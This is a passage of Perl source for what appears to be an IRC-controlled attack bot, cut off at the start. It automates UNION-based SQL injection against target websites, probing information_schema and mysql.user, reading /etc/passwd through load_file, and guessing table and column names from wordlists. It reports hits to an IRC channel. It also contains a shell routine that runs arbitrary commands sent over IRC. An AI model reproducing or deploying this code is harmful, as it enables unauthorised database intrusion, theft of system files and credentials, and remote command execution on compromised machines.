	$inyection = '';        $union = '';       }        $sql=$site."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cfin;        $response=get($sql);    if ($response =~ /loginpwnz/)		{        $column ++;        $sql=$site."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cfin;		 &msg("$chan","$sqllogo(MySQL)4 $sql ");        $sql=$site."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn."information_schema.tables".$cfin;        $response=get($sql)or die("[-] Impossible to get Information_Schema\n");         if($response =~ /loginpwnz/)         	{         	$sql=$site."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn."information_schema.tables".$cfin;			&msg("$chan","$sqllogo(SCHEMA)14 $sql ");         	}         $sql=$site."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn."mysql.user".$cfin;         $response=get($sql)or die("[-] Impossible to get MySQL.User\n");         if($response =~ /loginpwnz/)         	{         	$sql=$site."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn."mysql.user".$cfin;			&msg("$chan","$sqllogo(USER)14 $sql ");         	}         else         	{         	}	while ($loadcont < $column-1)	   {		$loadfile.=','.'load_file(0x2f6574632f706173737764)';		$loadcont++;	   }	   $sql=$site."-1".$cmn."union".$cmn."select".$cmn."load_file(0x2f6574632f706173737764)".$loadfile.$cfin;	 $response=get($sql)or die("[-] Impossible to inject LOAD_FILE\n");         if($response =~ /root:x:/)         	{			&msg("$chan","$sqllogo(Load File)14 $sql ");		}         else         	{         	}	          foreach $tabla(@tabele)                {                  chomp($tabla);                  $sql=$site."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn.$tabla.$cfin;		  $response=get($sql)or die("[-] Impossible to get tables\n");                  if($response =~ /loginpwnz/)                    {                    $sql=$site."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn.$tabla.$cfin;					&msg("$chan","$sqllogo(Tabel)14 $sql ");					&tabelka($site,$tabla);                    }                }	    }	}			}sub tabelka() {	my $site=$_[0];	my $tabla=$_[1];	my $cfin.="--";	my $cmn.= "+";            chomp($tabla);            foreach $columna(@kolumny)            {             chomp($columna);             $sql=$site."-1".$cmn."union".$cmn."select".$cmn."concat(0x6c6f67696e70776e7a,0x3a,$columna)".$inyection.$cmn."from".$cmn.$tabla.$cfin;             $response=get($sql)or die("[-] Impossible to get columns\n");             if ($response =~ /loginpwnz/)                {				&msg("$chan","$sqllogo(SQLi Vuln)4 $site (Kolom)14 $columna (Tabel)14 $tabla ");                }            }        }#########################################sub shell() {    my $path = $_[0];    my $cmd = $_[1];    if ($cmd =~ /cd (.*)/) {        chdir("$1") || &msg("$path","No such file or directory");        return;    }    elsif ($pid = fork) { waitpid($pid, 0); }    else { if (fork) { exit; } else {        my @output = `$cmd 2>&1 3>&1`;        my $c = 0;        foreach my $output (@output) {            $c++;            chop $output;            &msg("$path","$output");            if ($c == 5) { $c = 0; sleep 2; }        }        exit;    }}}sub isAdmin() {    my $status = 0;    my $nick = $_[0];    if ($nick eq $admin) { $status = 1; }    return $status;}sub msg() {    return unless $#_ == 1;    sendraw($IRC_cur_socket, "PRIVMSG $_[0] :$_[1]");}sub nick() {    return unless $#_ == 0;    sendraw("NICK $_[0]");}sub notice() {    return unless $#_ == 1;    sendraw("NOTICE $_[0] :$_[1]");}